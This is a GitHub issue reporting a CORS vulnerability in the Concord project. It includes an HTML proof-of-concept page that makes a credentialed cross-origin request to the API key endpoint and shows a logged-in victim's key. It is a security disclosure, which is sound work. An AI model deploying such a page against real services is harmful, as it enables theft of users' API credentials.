## Description

![@fitzpr](https://avatars.githubusercontent.com/u/5098252?u=c2c596034f2543e69b5025b2f6b5edabd997c4fd&v=4&size=48)[fitzpr](https://github.com/fitzpr)opened [on Mar 11, 2020](https://github.com/walmartlabs/concord/issues/22#issue-579396654)

Just a security issue I noticed where the accepted origins on CORS appear to be vulnerable.

If an authenticated user visits a page such as the following, the VICTIMSKEY is alerted. This could also be sent to an attacker.

```
<html>
   <head>
      <script>
         function cors() {
            var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        document.getElementById("emo").innerHTML = alert(this.responseText);
            }
         };
         xhttp.open("GET", "https://concord.endpoint.com/api/v1/apikey", true);
         xhttp.withCredentials = true;
         xhttp.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS PoC Exploit </h2>
      <h3>Show full content of page</h3>
      <div id="demo">
         <button type="button" onclick="cors()">Exploit</button>
      </div>
   </body>
</html>

```

### This comparison is taking too long to generate.

Unfortunately it looks like we can’t render this comparison for you right now. It might be too big, or there might be something weird with your repository.

You can try running this command locally to see the comparison on your machine:

`git diff 1.43.0...1.44.0`
